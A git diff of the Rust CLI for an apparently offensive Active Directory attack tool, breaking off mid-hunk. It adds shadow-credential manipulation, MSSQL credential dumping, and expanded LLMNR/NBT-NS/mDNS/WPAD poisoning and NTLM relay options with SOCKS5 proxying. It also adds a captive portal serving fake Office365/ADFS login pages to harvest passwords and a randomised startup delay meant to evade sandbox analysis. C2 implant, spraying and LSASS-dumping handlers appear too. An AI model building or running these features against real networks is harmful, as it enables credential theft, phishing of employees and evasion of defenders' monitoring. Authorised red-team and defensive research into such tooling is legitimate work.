@@ -262,6 +262,13 @@ enum Commands {
         action: commands::session::SessionAction,
     },
 
+    /// Manage cached Kerberos tickets (list/show/path/stats/clear)
+    #[command(alias = "ccaches", alias = "ccache")]
+    Ccach {
+        #[command(subcommand)]
+        action: commands::ccache::CcacheAction,
+    },
+
     /// Persistent TOML config management (init/show/path/set/unset/edit/save)
     #[command(alias = "cfg")]
     Config {
@@ -346,7 +353,7 @@ enum Commands {
     /// Password spraying
     #[cfg(feature = "hunter")]
     Spray {
-        #[arg(short, long)]
+        #[arg(long)]
         password: String,
         /// Optional path to username wordlist (one per line). Omit to use embedded list or --use-ldap.
         #[arg(short = 'U', long, alias = "users")]
@@ -393,9 +400,6 @@ enum Commands {
         /// Specific checks to run (smb, kerberos, winrm, network)
         #[arg(long, short, value_delimiter = ',')]
         checks: Vec<String>,
-        /// Domain controller to test connectivity against
-        #[arg(long = "target-dc")]
-        target_dc: Option<String>,
     },
 
     /// Generate engagement report (Markdown, PDF, JSON)
@@ -494,6 +498,30 @@ enum Commands {
         computer: Option<String>,
     },
 
+    /// Shadow Credential lifecycle management — add/list/remove/clear msDS-KeyCredentialLink entries
+    #[cfg(feature = "reaper")]
+    #[command(alias = "shadowcreds")]
+    ShadowCred {
+        #[command(subcommand)]
+        action: ShadowCredAction,
+    },
+
+    /// Domain risk assessment — PingCastle-style health scoring and risk analysis
+    #[cfg(feature = "reaper")]
+    #[command(alias = "risk")]
+    Assess {
+        /// Specific modules to run (default: all relevant modules)
+        #[arg(long, short, value_delimiter = ',')]
+        modules: Vec<String>,
+    },
+
+    /// BloodHound attack path analysis — import SharpHound JSON and query attack paths
+    #[command(alias = "bh")]
+    BloodHound {
+        #[command(subcommand)]
+        action: BloodHoundAction,
+    },
+
     /// Secrets dumping — offline SAM/LSA/DCC2 from registry hives
     Secrets {
         #[command(subcommand)]
@@ -540,7 +568,7 @@ enum Commands {
         #[arg(short, long, required = true)]
         targets: String,
         /// Port range (e.g., 80,443 or top1000)
-        #[arg(short = 'P', long, default_value = "top1000")]
+        #[arg(long, default_value = "top1000")]
         ports: String,
         /// Scan type
         #[arg(short = 'T', long, value_enum, default_value = "connect")]
@@ -562,11 +590,14 @@ enum Commands {
         no_smb: bool,
     },
 
-    /// MSSQL operations — query execution, linked servers, xp_cmdshell
+    /// MSSQL operations — query execution, linked servers, xp_cmdshell, audit
     #[command(alias = "sql")]
     Mssql {
         #[command(subcommand)]
         action: MssqlAction,
+        /// SOCKS5 proxy address (host:port) for MSSQL connections
+        #[arg(long, global = true)]
+        proxy: Option<String>,
     },
 
     /// Launch interactive TUI with live attack graph
@@ -681,6 +712,7 @@ enum ReportFormat {
     Markdown,
     Pdf,
     Json,
+    Xlsx,
 }
 
 #[derive(Subcommand, Debug, Clone, Copy)]
@@ -977,7 +1009,7 @@ enum AdcsAction {
         #[arg(short, long, required = true)]
         template: String,
         /// The issuance policy OID value linked to a privileged group
-        #[arg(short = 'P', long, required = true)]
+        #[arg(long = "policy-oid", required = true)]
         policy_oid: String,
         /// DN of the privileged group linked to the OID
         #[arg(short = 'G', long, required = true)]
@@ -1130,7 +1162,7 @@ enum SccmAction {
         #[arg(short, long, required = true)]
         app_name: String,
         /// Payload path
-        #[arg(short = 'P', long, required = true)]
+        #[arg(long, required = true)]
         payload: String,
     },
 }
@@ -1207,6 +1239,57 @@ enum MssqlAction {
     CheckXpCmdShell {
         #[arg(short, long, required = true)]
         target: String,
+    },
+    /// Full MSSQL security audit — checks misconfigurations, weak passwords, privilege paths
+    Audit {
+        /// Target SQL server(s) — comma-separated
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// Audit linked servers recursively (can be slow)
+        #[arg(long)]
+        crawl_links: bool,
+        /// Output file for audit results (JSON)
+        #[arg(short, long)]
+        output: Option<String>,
+    },
+    /// Dump SQL credentials — passwords, service credentials, linked server logins
+    DumpCredentials {
+        /// Target SQL server
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Database to target (default: master)
+        #[arg(short = 'D', long, default_value = "master")]
+        database: String,
+    },
+    /// Search database content for keywords or regex patterns
+    Search {
+        /// Target SQL server
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Keyword to search for (case-insensitive)
+        #[arg(long)]
+        keyword: Option<String>,
+        /// Regex pattern to match (case-insensitive)
+        #[arg(long)]
+        regex: Option<String>,
+        /// Database to search (default: all user databases)
+        #[arg(short = 'D', long)]
+        database: Option<String>,
+        /// Maximum rows to return per table (default: 100)
+        #[arg(long, default_value = "100")]
+        max_rows: usize,
+    },
+    /// Manage SQL Agent jobs — list, start, stop
+    AgentJob {
+        /// Target SQL server
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Action: list, start, stop, delete
+        #[arg(short, long, default_value = "list")]
+        action: String,
+        /// Job name (required for start/stop/delete)
+        #[arg(short, long)]
+        name: Option<String>,
     },
 }
 
@@ -1292,7 +1375,7 @@ enum C2Action {
         /// Command to execute
         command: String,
         /// Use PowerShell
-        #[arg(short = 'P', long)]
+        #[arg(long)]
         powershell: bool,
     },
     /// Deploy an implant to a target
@@ -1576,6 +1659,50 @@ enum KerberosAction {
 }
 
 // ──────────────────────────────────────────────────────────
+// Shadow Credential sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum ShadowCredAction {
+    /// Add a new KeyCredentialLink entry on the target object
+    Add {
+        /// Target DN or sAMAccountName
+        #[arg(required = true)]
+        target: String,
+        /// Key size in bits (default: 2048)
+        #[arg(long, default_value = "2048")]
+        key_size: u16,
+        /// Certificate validity in hours (default: 8760 = 1 year)
+        #[arg(long, default_value = "8760")]
+        validity_hours: u16,
+    },
+    /// List existing KeyCredentialLink entries on the target object
+    List {
+        /// Target DN or sAMAccountName
+        #[arg(required = true)]
+        target: String,
+    },
+    /// Remove a specific KeyCredentialLink entry by KeyId
+    Remove {
+        /// Target DN or sAMAccountName
+        #[arg(required = true)]
+        target: String,
+        /// Key ID of the credential to remove (from `list` output)
+        #[arg(long, required = true)]
+        key_id: String,
+    },
+    /// Remove all KeyCredentialLink entries from the target object
+    Clear {
+        /// Target DN or sAMAccountName
+        #[arg(required = true)]
+        target: String,
+        /// Skip confirmation prompt
+        #[arg(long)]
+        force: bool,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
 // SMB sub-commands
 // ──────────────────────────────────────────────────────────
 
@@ -1605,6 +1732,18 @@ enum SmbAction {
             default_value = ".txt,.docx,.xlsx,.pdf,.csv,.cfg,.ps1,.xml,.ini,.kdbx,.rdp,.vmdk,.vhdx,.pst,.ost"
         )]
         extensions: String,
+        /// Keyword to search inside file contents (case-insensitive)
+        #[arg(long)]
+        grep: Option<String>,
+        /// Regex pattern to match inside file contents
+        #[arg(long)]
+        regex: Option<String>,
+        /// Download matched files to this directory
+        #[arg(long)]
+        output_dir: Option<String>,
+        /// Maximum recursion depth (default: 10)
+        #[arg(long, default_value = "10")]
+        max_depth: usize,
     },
     /// Download a file from an SMB share
     Get {
@@ -1663,14 +1802,35 @@ enum NtlmAction {
         #[arg(short, long, default_value = "eth0")]
         interface: String,
         /// Listener port
-        #[arg(short, long, default_value = "0")]
+        #[arg(long, default_value = "0")]
         port: u16,
-        /// Disable LLMNR/NBT-NS poisoning (capture only)
+        /// Disable all poisoning (capture only mode)
         #[arg(long)]
         no_poison: bool,
         /// Enable mitm6 DHCPv6 poisoning
         #[arg(long)]
         mitm6: bool,
+        /// Enable mDNS poisoning (default: disabled)
+        #[arg(long)]
+        mdns: bool,
+        /// Enable LLMNR poisoning (default: enabled)
+        #[arg(long, default_value_t = true)]
+        llmnr: bool,
+        /// Enable NBT-NS poisoning (default: enabled)
+        #[arg(long, default_value_t = true)]
+        nbtns: bool,
+        /// Passive analysis mode — log queries without poisoning
+        #[arg(long)]
+        analyze: bool,
+        /// IP address to use in poisoned responses
+        #[arg(long)]
+        poison_ip: Option<String>,
+        /// WPAD proxy URL (e.g., http://192.168.1.5:8080) or PAC script path
+        #[arg(long)]
+        wpad: Option<String>,
+        /// SOCKS5 proxy for outbound connections (e.g. socks5://127.0.0.1:9050)
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// Generic NTLM relay to target
     Relay {
@@ -1678,7 +1838,7 @@ enum NtlmAction {
         #[arg(short, long, required = true, value_delimiter = ',')]
         targets: Vec<String>,
         /// Listener port
-        #[arg(short, long, default_value = "0")]
+        #[arg(long, default_value = "0")]
         port: u16,
         /// Command to execute on targets (if SMB)
         #[arg(short, long)]
@@ -1716,6 +1876,9 @@ enum NtlmAction {
         /// Validate TLS server certificates (non-relay/auditing mode)
         #[arg(long)]
         tls_verify: bool,
+        /// SOCKS5 proxy address (host:port)
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// NTLM relay via SMB protocol
     SmbRelay {
@@ -1723,7 +1886,7 @@ enum NtlmAction {
         #[arg(short, long, required = true, value_delimiter = ',')]
         targets: Vec<String>,
         /// Listener port
-        #[arg(short, long, default_value = "0")]
+        #[arg(long, default_value = "0")]
         port: u16,
         /// Command to execute on targets
         #[arg(short, long)]
@@ -1758,6 +1921,9 @@ enum NtlmAction {
         /// Validate TLS server certificates (non-relay/auditing mode)
         #[arg(long)]
         tls_verify: bool,
+        /// SOCKS5 proxy address (host:port)
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// NTLM relay via HTTP protocol
     HttpRelay {
@@ -1765,7 +1931,7 @@ enum NtlmAction {
         #[arg(short, long, required = true, value_delimiter = ',')]
         targets: Vec<String>,
         /// Listener port
-        #[arg(short, long, default_value = "0")]
+        #[arg(long, default_value = "0")]
         port: u16,
         /// Command to execute on targets
         #[arg(short, long)]
@@ -1800,6 +1966,9 @@ enum NtlmAction {
         /// Validate TLS server certificates (non-relay/auditing mode)
         #[arg(long)]
         tls_verify: bool,
+        /// SOCKS5 proxy for outbound connections
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// Enhanced HTTP asymmetric relay — full request capture and replay
     HttpAsymmetric {
@@ -1807,7 +1976,7 @@ enum NtlmAction {
         #[arg(short, long, required = true, value_delimiter = ',')]
         targets: Vec<String>,
         /// HTTP listener port
-        #[arg(short, long, default_value = "80")]
+        #[arg(long, default_value = "80")]
         port: u16,
         /// Network interface to listen on
         #[arg(short, long, default_value = "0.0.0.0")]
@@ -1822,7 +1991,7 @@ enum NtlmAction {
         #[arg(short, long, required = true)]
         target: String,
         /// Listener port
-        #[arg(short, long, default_value = "389")]
+        #[arg(long, default_value = "389")]
         port: u16,
         /// Use LDAPS
         #[arg(long)]
@@ -1854,6 +2023,9 @@ enum NtlmAction {
         /// Validate TLS server certificates (non-relay/auditing mode)
         #[arg(long)]
         tls_verify: bool,
+        /// SOCKS5 proxy for outbound connections
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// Standalone SMB daemon for credential capture
     SmbDaemon {
@@ -1861,7 +2033,7 @@ enum NtlmAction {
         #[arg(short, long, default_value = "eth0")]
         interface: String,
         /// Listener port
-        #[arg(short, long, default_value = "445")]
+        #[arg(long, default_value = "445")]
         port: u16,
     },
     /// TLS-wrapped NTLM relay with optional mTLS client certificate verification
@@ -1870,7 +2042,7 @@ enum NtlmAction {
         #[arg(short, long, required = true, value_delimiter = ',')]
         targets: Vec<String>,
         /// TLS listener port (typically 443 for HTTPS relay)
-        #[arg(short, long, default_value = "443")]
+        #[arg(long, default_value = "443")]
         port: u16,
         /// Network interface to listen on
         #[arg(short, long, default_value = "0.0.0.0")]
@@ -1897,7 +2069,7 @@ enum NtlmAction {
         #[arg(short, long, required = true)]
         target: String,
         /// Exchange listener port
-        #[arg(short, long, default_value = "443")]
+        #[arg(long, default_value = "443")]
         port: u16,
         /// Disable TLS
         #[arg(long)]
@@ -1923,6 +2095,28 @@ enum NtlmAction {
         /// Validate TLS server certificates (non-relay/auditing mode)
         #[arg(long)]
         tls_verify: bool,
+        /// SOCKS5 proxy for outbound connections (e.g. socks5://127.0.0.1:9050)
+        #[arg(long)]
+        socks5_proxy: Option<String>,
+    },
+
+    /// Captive portal — serve fake login pages for form-based credential capture
+    CaptivePortal {
+        /// Port to serve the captive portal on
+        #[arg(long, default_value = "8080")]
+        port: u16,
+        /// Network interface to listen on
+        #[arg(short, long, default_value = "0.0.0.0")]
+        interface: String,
+        /// Portal template style (generic, office365, adfs)
+        #[arg(long, default_value = "generic")]
+        template: String,
+        /// Company name displayed on the login page
+        #[arg(long, default_value = "IT Department")]
+        company: String,
+        /// Target URL to redirect victims to after login
+        #[arg(long)]
+        redirect_url: Option<String>,
     },
 }
 
@@ -2139,6 +2333,78 @@ enum MoveAction {
 }
 
 // ──────────────────────────────────────────────────────────
+// BloodHound attack path analysis sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum BloodHoundAction {
+    /// Import SharpHound v2 JSON files from a directory into an attack graph
+    Import {
+        /// Directory containing BloodHound JSON files (*_users.json, *_computers.json, etc.)
+        dir: String,
+        /// Output file for the serialized attack graph (.json)
+        #[arg(short, long)]
+        output: Option<String>,
+    },
+    /// Find shortest attack path between two nodes
+    Path {
+        /// Source node (name@domain)
+        from: String,
+        /// Target node (name@domain)
+        to: String,
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+    },
+    /// Find all paths to Domain Admin from a starting node
+    PathToDa {
+        /// Source node (name@domain)
+        from: String,
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+    },
+    /// Show graph statistics
+    Stats {
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+    },
+    /// Find what targets are reachable from a starting node
+    Reachable {
+        /// Source node (name@domain)
+        from: String,
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+    },
+    /// List high-value targets ranked by graph centrality
+    HighValue {
+        /// Number of top targets to show
+        #[arg(long, default_value = "10")]
+        top: usize,
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+    },
+    /// Run all pre-built BloodHound-style queries and produce a comprehensive analysis report
+    Analyze {
+        /// Path to a serialized attack graph JSON file
+        #[arg(short, long)]
+        graph: String,
+        /// Target domain for DA path analysis
+        #[arg(long, default_value = "corp.local")]
+        domain: String,
+        /// Max number of cheapest DA paths to include
+        #[arg(long, default_value_t = 25)]
+        limit: usize,
+        /// Output file for JSON report (optional)
+        #[arg(short, long)]
+        output: Option<String>,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
 // Offline secrets dumping sub-commands
 // ──────────────────────────────────────────────────────────
 
@@ -2287,6 +2553,17 @@ fn main() -> ExitCode {
     let thread = match std::thread::Builder::new()
         .stack_size(8 * 1024 * 1024)
         .spawn(|| -> i32 {
+            // Anti-emulation: short startup delay to evade basic sandbox heuristics.
+            // Randomised 500-1500ms to defeat deterministic skip logic.
+            let delay = (std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_millis()
+                % 1000
+                + 500) as u64;
+            if delay > 0 {
+                std::thread::sleep(std::time::Duration::from_millis(delay));
+            }
             match tokio::runtime::Builder::new_multi_thread()
                 .enable_all()
                 .build()
@@ -2417,6 +2694,9 @@ async fn async_main() -> i32 {
                 }
             }
         }
+        Commands::Ccach { ref action } => commands::ccache::run(commands::ccache::CcacheArgs {
+            action: action.clone(),
+        }),
         Commands::Config { ref action } => {
             match commands::config::run(commands::config::ConfigArgs {
                 action: action.clone(),
@@ -2490,24 +2770,13 @@ async fn async_main() -> i32 {
             commands_impl::cmd_dump_lsass(&cli, output.as_deref(), method, pid, !no_etw_suppress)
                 .await
         }
-        Commands::Doctor {
-            ref checks,
-            ref target_dc,
-        } => {
+        Commands::Doctor { ref checks } => {
             let checks_opt = if checks.is_empty() {
                 None
             } else {
                 Some(checks.clone())
             };
-            let mut exit = commands::doctor::run(checks_opt).await;
-            let effective_dc = target_dc.as_deref().or(cli.dc_host.as_deref());
-            if let Some(dc) = effective_dc {
-                exit |= crate::commands::doctor::check_dc_connectivity(dc)
-                    .await
-                    .iter()
-                    .any(|r| !r.passed) as i32;
-            }
-            exit
+            commands::doctor::run(checks_opt, cli.dc_host.as_deref()).await
         }
         #[cfg(feature = "scribe")]
         Commands::Report {
@@ -2554,6 +2823,11 @@ async fn async_main() -> i32 {
         } => commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await,
         #[cfg(feature = "reaper")]
         Commands::Laps { ref computer } => commands_impl::cmd_laps(&cli, computer.as_deref()).await,
+        #[cfg(feature = "reaper")]
+        Commands::ShadowCred { ref action } => commands_impl::cmd_shadow_cred(&cli, action).await,
+        #[cfg(feature = "reaper")]
+        Commands::Assess { ref modules } => commands_impl::cmd_assess(&cli, modules).await,
+        Commands::BloodHound { ref action } => commands_impl::cmd_bloodhound(&cli, action).await,
         Commands::Secrets { ref action } => commands_impl::cmd_secrets(action).await,
         #[cfg(feature = "relay")]
         Commands::Ntlm { ref action } => cmd_ntlm(action.clone()).await,
@@ -2585,7 +2859,10 @@ async fn async_main() -> i32 {
             )
             .await
         }
-        Commands::Mssql { ref action } => cmd_mssql(&cli, action.clone()).await,
+        Commands::Mssql {
+            ref action,
+            ref proxy,
+        } => cmd_mssql(&cli, action.clone(), proxy.as_deref()).await,
         #[cfg(feature = "viewer")]
         Commands::Tui {
             ref domain,
@@ -3289,11 +3566,11 @@ async fn cmd_edr(_cli: &Cli, action: EdrAction) -> i32 {
                         println!("    - {}", finding);
                     }
                     banner::print_success("EDR assessment complete");
-                    0
+                    return 0;
                 }
                 Err(e) => {
                     banner::print_fail(&format!("EDR assessment failed: {}", e));
-                    1
+                    return 1;
                 }
             }
         }
@@ -3332,21 +3609,21 @@ async fn cmd_edr(_cli: &Cli, action: EdrAction) -> i32 {
                                     println!("    - {}", err);
                                 }
                             }
-                            0
                         }
                         Err(e) => {
                             banner::print_fail(&format!("Evasion failed: {}", e));
-                            1
+                            return 1;
                         }
                     }
                 }
                 Err(e) => {
                     banner::print_fail(&format!("EDR assessment failed: {}", e));
-                    1
+                    return 1;
                 }
             }
         }
     }
+    0
 }
 
 // cmd_exploit — CVE Exploit handler
@@ -3394,7 +3671,7 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
     {
         Ok(s) => s,
         Err(e) => {
-            banner::print_fail(&format!("LDAP connect failed: {e}"));
+            banner::print_fail(&format!("LDAP connect to {dc_ip} for {domain} failed: {e}"));
             return 1;
         }
     };
@@ -3425,7 +3702,7 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                     0
                 }
                 Err(e) => {
-                    banner::print_fail(&format!("sAMAccountName spoof failed: {e}"));
+                    banner::print_fail(&format!("sAMAccountName spoof of {dc_sam} failed: {e}"));
                     1
                 }
             }
@@ -3454,7 +3731,7 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                     0
                 }
                 Err(e) => {
-                    banner::print_fail(&format!("Shadow Credentials failed: {e}"));
+                    banner::print_fail(&format!("Shadow credentials on {target_dn} failed: {e}"));
                     1
                 }
             }
@@ -3486,7 +3763,7 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                     0
                 }
                 Err(e) => {
-                    banner::print_fail(&format!("RBCD failed: {e}"));
+                    banner::print_fail(&format!("RBCD on {target_dn} for {attacker} failed: {e}"));
                     1
                 }
             }
@@ -3506,7 +3783,9 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                                 0
                             }
                             Err(e) => {
-                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                banner::print_fail(&format!(
+                                    "Cleanup samname-spoof on {dn} failed: {e}"
+                                ));
                                 1
                             }
                         }
@@ -3523,7 +3802,9 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                                 0
                             }
                             Err(e) => {
-                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                banner::print_fail(&format!(
+                                    "Cleanup shadow-cred on {dn} failed: {e}"
+                                ));
                                 1
                             }
                         }
@@ -3540,7 +3821,7 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
                                 0
                             }
                             Err(e) => {
-                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                banner::print_fail(&format!("Cleanup rbcd on {dn} failed: {e}"));
                                 1
                             }
                         }
@@ -3588,8 +3869,12 @@ fn load_tls_config(
     };
     match (cert_path, key_path) {
         (Some(cert), Some(key)) => {
-            let identity =
-                overthrone_relay::tls::TlsIdentity::load(cert, key).map_err(|e| format!("{e}"))?;
+            let identity = overthrone_relay::tls::TlsIdentity::load(cert, key).map_err(|e| {
+                format!(
+                    "Failed to load TLS identity (cert={:?}, key={:?}): {e}",
+                    cert, key
+                )
+            })?;
             Ok(Some(overthrone_relay::tls::TlsConfig {
                 verification_mode,
                 identity: Some(identity),
@@ -3680,22 +3965,39 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             port: _,
             no_poison,
             mitm6,
+            mdns,
+            llmnr,
+            nbtns,
+            analyze,
+            poison_ip,
+            wpad,
+            socks5_proxy,
         } => {
             println!(
-                "{} Starting NTLM capture on {} {}",
+                "{} Starting NTLM capture on {}{}{}{}{}",
                 "🎯".bright_black(),
                 interface.cyan(),
                 if no_poison {
-                    "(relay-only / no poison)"
+                    " (relay-only / no poison)"
                 } else {
                     ""
-                }
+                },
+                if analyze { " (analyze-only)" } else { "" },
+                if wpad.is_some() {
+                    " (WPAD enabled)"
+                } else {
+                    ""
+                },
+                if mdns { " (mDNS enabled)" } else { "" },
             );
+
+            let wpad_config = wpad.map(|url| overthrone_relay::WpadConfig::new(url));
+
             let config = RelayControllerConfig {
                 interface: interface.clone(),
-                llmnr: true,
-                nbtns: true,
-                mdns: false,
+                llmnr,
+                nbtns,
+                mdns,
                 mitm6,
                 responder: true,
                 relay_targets: vec![],
@@ -3707,13 +4009,16 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 tls_config: None,
                 auto_coerce_targets: Vec::new(),
                 auto_coerce_listener: None,
-                socks5_proxy: None,
+                socks5_proxy,
                 http_relay_config: None,
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
                 auto_coerce_credentials: None,
                 tls_relay_config: None,
+                analyze_only: analyze,
+                poison_ip,
+                wpad_config,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3748,6 +4053,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             tls_client_cert,
             tls_client_key,
             tls_verify,
+            socks5_proxy,
         } => {
             println!(
                 "{} Starting NTLM relay to {} targets {}",
@@ -3806,7 +4112,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 tls_config,
                 auto_coerce_targets,
                 auto_coerce_listener,
-                socks5_proxy: None,
+                socks5_proxy,
                 http_relay_config: None,
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
@@ -3817,6 +4123,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     auto_coerce_password,
                 ),
                 tls_relay_config: None,
+                analyze_only: false,
+                poison_ip: None,
+                wpad_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3853,6 +4162,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             tls_client_cert,
             tls_client_key,
             tls_verify,
+            socks5_proxy,
         } => {
             println!(
                 "{} Starting SMB relay to {} targets",
@@ -3902,7 +4212,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 tls_config,
                 auto_coerce_targets,
                 auto_coerce_listener,
-                socks5_proxy: None,
+                socks5_proxy,
                 http_relay_config: None,
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
@@ -3913,6 +4223,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     auto_coerce_password,
                 ),
                 tls_relay_config: None,
+                analyze_only: false,
+                poison_ip: None,
+                wpad_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3949,6 +4262,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             tls_client_cert,
             tls_client_key,
             tls_verify,
+            socks5_proxy,
         } => {
             println!(
                 "{} Starting HTTP relay to {} targets",
@@ -4002,7 +4316,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 tls_config,
                 auto_coerce_targets,
                 auto_coerce_listener,
-                socks5_proxy: None,
+                socks5_proxy,
                 http_relay_config: None,
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
@@ -4013,6 +4327,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     auto_coerce_password,
                 ),
                 tls_relay_config: None,
+                analyze_only: false,
+                poison_ip: None,
+                wpad_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -4120,7 +4437,11 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             match relay.start().await {
                 Ok(_) => {
                     banner::print_success("HTTP asymmetric relay started");
-                    tokio::signal::ctrl_c().await.unwrap();
+                    if tokio::signal::ctrl_c().await.is_err() {
+                        banner::print_fail(
+                            "Failed to register Ctrl+C handler — continuing shutdown",
+                        );
+                    }
                     let _ = relay.stop().await;
                     0
                 }
@@ -4143,6 +4464,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             tls_client_cert,
             tls_client_key,
             tls_verify,
+            socks5_proxy,
         } => {
             let tls_config = match load_tls_config(
                 tls_client_cert.as_deref(),
@@ -4209,7 +4531,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 tls_config,
                 auto_coerce_targets,
                 auto_coerce_listener,
-                socks5_proxy: None,
+                socks5_proxy,
                 http_relay_config: None,
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
@@ -4220,6 +4542,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     auto_coerce_password,
                 ),
                 tls_relay_config: None,
+                analyze_only: false,
+                poison_ip: None,
+                wpad_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -4262,8 +4587,11 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             match daemon.start().await {
                 Ok(_) => {
                     banner::print_success("SMB daemon started — capturing credentials on port 445");
-                    // Keep running until Ctrl+C
-                    tokio::signal::ctrl_c().await.unwrap();
+                    if tokio::signal::ctrl_c().await.is_err() {
+                        banner::print_fail(
+                            "Failed to register Ctrl+C handler — continuing shutdown",
+                        );
+                    }
                     daemon.stop();
                     let captured = daemon.get_captured_credentials();
                     println!(
@@ -4336,7 +4664,11 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             match relay.start().await {
                 Ok(_) => {
                     banner::print_success("TLS relay started");
-                    tokio::signal::ctrl_c().await.unwrap();
+                    if tokio::signal::ctrl_c().await.is_err() {
+                        banner::print_fail(
+                            "Failed to register Ctrl+C handler — continuing shutdown",
+                        );
+                    }
                     relay.stop().await;
                     0
                 }
@@ -4357,6 +4689,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             tls_client_cert,
             tls_client_key,
             tls_verify,
+            socks5_proxy,
         } => {
             println!(
                 "{} Starting Exchange NTLM relay to {}{}",
@@ -4404,7 +4737,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     }
                     _ => overthrone_relay::exchange::ExchangeVersion::AutoDetect,
                 },
-                socks5_proxy: None,
+                socks5_proxy,
                 endpoint_type: overthrone_relay::exchange::ExchangeEndpoint::Auto,
                 tls_config,
             };
@@ -4416,6 +4749,57 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 }
                 Err(e) => {
                     banner::print_fail(&format!("Exchange relay failed: {}", e));
+                    1
+                }
+            }
+        }
+
+        NtlmAction::CaptivePortal {
+            port,
+            interface,
+            template,
+            company,
+            redirect_url,
+        } => {
+            use overthrone_relay::captive_portal::{
+                CaptivePortal, CaptivePortalConfig, CaptivePortalTemplate,
+            };
+
+            let template_enum: CaptivePortalTemplate = match template.to_lowercase().as_str() {
+                "office365" => CaptivePortalTemplate::Office365,
+                "adfs" => CaptivePortalTemplate::Adfs,
+                _ => CaptivePortalTemplate::Generic,
+            };
+
+            let ip: std::net::IpAddr = interface
+                .parse()
+                .unwrap_or(std::net::IpAddr::V4(std::net::Ipv4Addr::new(0, 0, 0, 0)));
+
+            let config = CaptivePortalConfig {
+                listen_ip: ip,
+                listen_port: port,
+                template: template_enum,
+                company_name: company.clone(),
+                target_url: redirect_url.clone(),
+                ..CaptivePortalConfig::default()
+            };
+
+            let mut portal = CaptivePortal::new(config);
+            match portal.start() {
+                Ok(_) => {
+                    banner::print_success(&format!(
+                        "Captive portal started on {}:{} (template: {})",
+                        interface, port, template
+                    ));
+                    println!("  {} Press Enter to stop...", ">".bright_black());
+                    let mut input = String::new();
+                    let _ = std::io::stdin().read_line(&mut input);
+                    let _ = portal.stop();
+                    println!("  {} Captive portal stopped", "[+]".green());
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Captive portal failed: {}", e));
                     1
                 }
             }
@@ -5582,17 +5966,23 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     return 1;
                 }
             };
-            // Step 1: Get a TGT
-            let tgt =
-                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
-                    .await
-                {
-                    Ok(t) => t,
-                    Err(e) => {
-                        banner::print_fail(&format!("TGT request failed: {}", e));
-                        return 1;
-                    }
-                };
+            // Step 1: Get a TGT (with cache-first logic)
+            let tgt = match crate::commands_impl::get_cached_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
